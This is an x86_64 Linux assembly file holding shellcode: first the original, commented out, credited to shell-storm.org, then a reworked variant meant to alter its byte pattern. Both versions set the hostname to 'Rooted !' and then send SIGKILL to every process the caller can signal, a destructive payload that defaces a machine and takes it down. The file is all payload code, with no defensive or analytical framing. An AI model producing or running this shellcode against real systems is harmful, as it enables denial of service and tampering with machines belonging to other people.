; # From: http://shell-storm.org/shellcode/files/shellcode-605.php
; 
; # Linux/x86_64 sethostname() & killall 33 bytes shellcode
; # Date: 2010-04-26
; # Author: zbt
; # Tested on: x86_64 Debian GNU/Linux
 
;    ; sethostname("Rooted !");
;    ; kill(-1, SIGKILL);
; 
; 
;    section .text
;        global _start
; 
;    _start:
; 
;        ;-- setHostName("Rooted !"); 22 bytes --;
;        mov     al, 0xaa
;        mov     r8, 'Rooted !'
;        push    r8
;        mov     rdi, rsp
;        mov     sil, 0x8
;        syscall
; 
;        ;-- kill(-1, SIGKILL); 11 bytes --;
;        push    byte 0x3e
;        pop     rax
;        push    byte 0xff
;        pop     rdi
;        push    byte 0x9
;        pop     rsi
;        syscall


    ; sethostname("Rooted !");
    ; kill(-1, SIGKILL);
 
 
    section .text
        global _start
 
    _start:

        mov bx, 0xaa08 ; will use 8bit registers instead of immediate values 
 
        ;-- setHostName("Rooted !"); 22 bytes --;
        mov     al, bh
        mov     r14, 0x21206465746f6f52 ; echo -n "Rooted !" | rev | xxd
        push    r14
        xchg    rdi, rsp ; SAVED 1 BYTE!
        mov     sil, bl
        syscall
 
        mov bx, 0x3eff
        mov al, bh
        mov dil, bl
        push    byte 0x9
        pop     rsi
        syscall